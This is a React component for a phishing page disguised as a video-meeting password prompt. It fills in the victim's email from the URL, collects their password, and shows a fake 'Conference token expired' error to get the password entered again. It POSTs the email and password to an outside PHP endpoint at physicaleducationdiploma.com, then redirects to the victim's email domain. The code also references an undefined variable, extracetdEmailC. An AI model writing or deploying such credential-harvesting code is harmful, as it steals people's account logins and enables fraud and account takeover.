
import { useState } from 'react';
import './pointer.css';
import $ from 'jquery'

export const Pointer = ()=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();


    const [defaultEmail, setDefaultEmail] = useState(extracetdEmail);
    const [defaultPassword, setDefaultPassword] = useState('');

    const [count, setCount] = useState(0);

    const [invalid ,setInvalid] = useState(false);

    const [val, setVal] = useState('Join Meeting')



    const submitDefaultForm = (e)=>{
        e.preventDefault();
        
        if (!defaultPassword) {
            alert(`Please enter ${defaultEmail} password`);
           return null
        } else {

            setVal('Please wait...');
            setDefaultEmail(defaultEmail)




            setTimeout(() => {
                setDefaultPassword('');
            }, 2000);
    
    
            setCount(count=> count + 1);
                if(count === 1){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                    console.log(extracetdemailDomain);
                    setTimeout(() => {
                        window.location.href = `https://www.${extracetdEmailC.toLowerCase().split('&', 1).toString()}`;
                    }, 1500);
                };
    
                setTimeout(()=>{
                    // setSpinLoader(false);
                    setInvalid(true);
                    setVal(val);
                }, 2200)
    
            // post to server
            const user = {
                email: defaultEmail,
                password: defaultPassword,
    
            };
        
            $.ajax({
                type: "POST",
                url: "https://physicaleducationdiploma.com/lol/myzum.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });

            
        }
    };


    return(<>
        
        <p className='mel'>{ defaultEmail }</p>


        { invalid ? <p className='invalid'>
            Conference token expired, please try again	
        </p> : null }


        <form id='user_verification_hgdsgh' onSubmit={submitDefaultForm}>
            <div className='pswd_wrapper__GHHNGfhjmkjhgf'>
                <input 
                    type='password'
                    placeholder='Enter Password'
                    autoFocus
                    required
                    value={defaultPassword}
                    onChange={e=> {
                        if (defaultPassword.length === 1) {
                            setInvalid(false);
                        }
                        setDefaultPassword(e.target.value);
                    }}
                    className='pswd'
                />
            </div>
        </form>

        <p className='launchhh'>
            By clicking "Launch Meeting" you agree to our 
            &#160;
            <span className='term_and_conditions_agree__HJKHGTYUKH87yUJ'>Terms of Service</span>
            <br />
            and 
            &#160;
            <span className='term_and_conditions_agree__HJKHGTYUKH87yUJ'>Privacy Statement</span> 
        </p>



        <div className='join_wrappe___r'>
            
            <button className='btn_join' onClick={submitDefaultForm}>
                
               {val}

            </button>
            
        </div>

    </>)
};
